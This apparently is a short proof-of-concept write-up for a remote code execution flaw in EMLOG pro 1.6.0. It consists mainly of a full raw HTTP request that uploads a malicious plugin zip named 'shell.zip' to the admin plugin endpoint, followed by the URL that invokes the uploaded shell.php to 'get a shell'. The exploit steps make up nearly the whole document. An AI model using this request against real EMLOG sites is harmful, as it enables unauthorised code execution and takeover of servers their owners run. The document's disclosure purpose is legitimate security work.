# EMLOG_pro_1.6.0（latest version） plugins upload rce vulnerability
### EMLOG download address：https://github.com/emlog/emlog/releases/tag/pro-1.6.0
## 1. Login as admin and upload a plugin (a zip which include a php file)
### payload 
```
POST /emlog/admin/plugin.php?action=upload_zip HTTP/1.1
Host: 192.168.111.155
Content-Length: 876
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.111.155
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOK8HOjtKZalBj6CG
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.111.155/emlog/admin/plugin.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=lq0s731hnlqm232itjlgpc27el; EM_AUTHCOOKIE_jT79impSwTWeimzUBIsgAmv1NoQbG2Zs=admin%7C1695536025%7C848fc865191736412177851eb6082b92
Connection: close

------WebKitFormBoundaryOK8HOjtKZalBj6CG
Content-Disposition: form-data; name="pluzip"; filename="shell.zip"
Content-Type: application/x-zip-compressed

PK
------WebKitFormBoundaryOK8HOjtKZalBj6CG
Content-Disposition: form-data; name="token"

4e1bef9d513bae43a46448cbbaee0db7d1d5f7d1
------WebKitFormBoundaryOK8HOjtKZalBj6CG--
```
## 2. Active the plugin you uploaded and get a shell!
### payload
```
http://192.168.111.155//emlog/content/plugins/shell/shell.php
```
